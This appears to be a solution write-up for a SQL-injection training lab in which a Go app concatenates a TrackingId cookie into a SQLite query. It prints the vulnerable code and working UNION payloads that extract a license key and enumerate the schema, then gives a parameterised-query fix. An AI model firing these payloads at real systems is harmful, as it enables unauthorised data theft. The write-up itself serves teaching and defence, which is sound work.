# Solution — sqli-cookie-tracking-id

> **Deployment note (simplification).** The catalog sketch for this lab imagined a
> Caddy reverse proxy in front of the Go app. It is deliberately omitted: SQLite
> is in-process (mattn/go-sqlite3), so the whole lab is a _single_ container with
> no separate database service and no proxy. Nothing about the vulnerability or
> the exploit changes — the app listens directly on `:8080`.

## What tipped you off

The site sets a `TrackingId` cookie on first visit and then renders a banner that
depends on it — and it echoes the tracking id straight back onto the page. That is
the tell: your input reaches server-side logic, but it arrives through the
**Cookie header**, not the URL. Fuzzing query-string parameters finds nothing,
because none of them touch the database. The moment you tamper with the cookie
value (a stray single quote), the banner block changes or a "Personalisation
unavailable" error appears — proof the value lands inside SQL.

## The class of bug

SQL injection (**CWE-89**, **OWASP A03:2021 – Injection**) through a request
header. Mechanically it is identical to a query-string injection; the only twist
is the _location_ of the sink. Because the value sits inside a single-quoted
string literal, this is a classic string-context injection, and with a single
result column it is a textbook **UNION-based** extraction — here against the
SQLite dialect.

## Vulnerability

`src/main.go`, `lookupBanners`:

```go
query := "SELECT banner FROM banners WHERE trackingid = '" + trackingID + "'"
rows, err := db.Query(query)
```

`trackingID` is the raw value of the `TrackingId` cookie
(`r.Cookie("TrackingId").Value`), concatenated into the SQL text with no
parameterisation, quoting, or allowlist. The query returns one column (`banner`),
which the handler renders verbatim (HTML-escaped, but hex/underscore secrets pass
through unchanged) — a perfect in-band read channel.

## Why the developer wrote it this way

Two very human mistakes stacked on top of each other:

1. **"The server sets this cookie, so it is trusted."** Developers instinctively
   validate form fields and URL parameters but treat their own cookies as opaque,
   machine-generated tokens. A cookie is still attacker-controlled input — the
   client can send any value it likes.
2. **"It is just a lookup key."** Building the query by concatenation _feels_
   safe when the value is "always" a random id the code generated a moment ago.
   It passes every test, because every test uses a well-formed tracking id.

## Why it exists

The value is placed inside a string literal (`'...'`) and the app renders the
returned column back to the page, so the injection is both **string-context** and
**in-band**: an attacker can close the literal, append `UNION SELECT`, and read
the union output directly from the response — no error oracle or timing needed.
SQLite makes it easy: `--` starts a comment to end of line, `UNION` has no
`LIMIT`/`ORDER BY` quirks to fight, and column counts must simply match (one
here). The secret lives one table away in `internal_config.license_key`, and the
`/solve` endpoint turns "read that value" into "unlock the flag."

## The mechanical exploit

Send a `TrackingId` cookie whose value breaks out of the string literal and
UNION-selects the secret column. The original query selects **one** column
(`banner`), so the UNION must also select one:

```
Cookie: TrackingId=x' UNION SELECT license_key FROM internal_config-- -
```

The server builds:

```sql
SELECT banner FROM banners WHERE trackingid = 'x' UNION SELECT license_key FROM internal_config-- -'
```

`'x'` matches no seeded banner (left side returns zero rows), the `UNION` appends
the `license_key`, and `-- -` comments out the dangling trailing quote. Note the
value contains spaces and a single quote; Go's cookie parser (`net/http`) splits
only on `;` and accepts every byte in `0x20–0x7e` except `" ; \`, so the whole
payload survives verbatim into `r.Cookie(...).Value`.

The `license_key` (format `LK_<40 hex>`) comes back inside the banner `<div>`.
Read it, then unlock the flag:

```
GET /solve?license=LK_<the recovered value>   ->   200 text/plain   FLAG{...}
```

A wrong or missing license answers **HTTP 402 Payment Required**.

## Exploit walkthrough

`tests/exploit.py` (Python standard library only) does exactly this:

1. `GET /` with an explicit `Cookie: TrackingId=x' UNION SELECT license_key FROM
internal_config-- -` header. It uses an `http.cookiejar`-backed opener but
   sets the `Cookie` header itself, so the jar's `add_cookie_header` (which only
   fills a missing `Cookie` header) never clobbers the injected value with a
   server-issued tracking id.
2. Parse `LK_[0-9a-f]{40}` from the response body → the per-container license key.
3. `GET /solve?license=<value>` and extract `FLAG\{[0-9a-f]{64}\}` from the body.
4. Recompute the expected flag as
   `FLAG{ hmac_sha256(LAB_USER_SECRET, "v1|sqli-cookie-tracking-id") }` and assert
   equality (mismatch exits 2). The recovered flag is printed on the last stdout
   line. It runs in well under 60 seconds.

**Optional harder path (no shortcut used above).** If you did not know the table
or column names, enumerate them the SQLite way — the same UNION channel reads the
schema:

```
TrackingId=x' UNION SELECT sql FROM sqlite_master WHERE type='table'-- -
TrackingId=x' UNION SELECT name FROM pragma_table_info('internal_config')-- -
```

## Fix

Never concatenate request-controlled data — cookie, header, or parameter — into
SQL. Bind it as a parameter so it can only ever be a value, never code:

```go
const q = "SELECT banner FROM banners WHERE trackingid = ?"
rows, err := db.Query(q, trackingID)
```

With a placeholder the driver sends the tracking id out-of-band as data, and the
`UNION` payload becomes an ordinary (non-matching) string that selects nothing.
Defence in depth: treat cookies as untrusted input, sign/opaque-ID them if they
must round-trip, apply least-privilege so the app's DB role cannot read
`internal_config`, and avoid rendering raw query output or verbose DB errors.
